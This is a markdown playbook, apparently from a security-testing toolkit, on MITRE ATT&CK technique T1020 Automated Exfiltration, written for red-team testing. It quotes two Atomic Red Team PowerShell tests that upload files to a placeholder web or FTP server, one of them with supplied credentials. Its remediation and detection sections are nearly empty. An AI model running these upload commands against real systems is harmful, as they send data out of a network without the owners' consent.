---
name: "T1020_automated-exfiltration"
description: "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1020
  - exfiltration
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1020"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1020"
tech_stack:
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1020.001
prerequisites: []
severity_boost:
  T1020.001: "Chain with T1020.001 for deeper attack path"
---

# T1020 Automated Exfiltration

## High-Level Description

Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Automated Exfiltration technique is applicable to target environment
- [ ] Check Linux systems for indicators of Automated Exfiltration
- [ ] Check macOS systems for indicators of Automated Exfiltration
- [ ] Check Network Devices systems for indicators of Automated Exfiltration
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: IcedID Botnet HTTP PUT

Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

**Supported Platforms:** windows

```powershell
$fileName = "#{file}"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
```

### Atomic Test 2: Exfiltration via Encrypted FTP

Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.

**Supported Platforms:** windows

```powershell
$sampleData = "Sample data for exfiltration test"
Set-Content -Path "#{sampleFile}" -Value $sampleData
$ftpUrl = "#{ftpServer}"
$creds = Get-Credential -Credential "#{credentials}"
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Automated Exfiltration by examining the target platforms (Linux, macOS, Network Devices).

2. **Assess Existing Defenses**: Review whether mitigations for T1020 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Automated Exfiltration Detection Strategy

## Risk Assessment

| Finding                                     | Severity | Impact       |
| ------------------------------------------- | -------- | ------------ |
| Automated Exfiltration technique applicable | Low      | Exfiltration |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [ESET Gamaredon June 2020](https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/)
- [Atomic Red Team - T1020](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1020)
- [MITRE ATT&CK - T1020](https://attack.mitre.org/techniques/T1020)
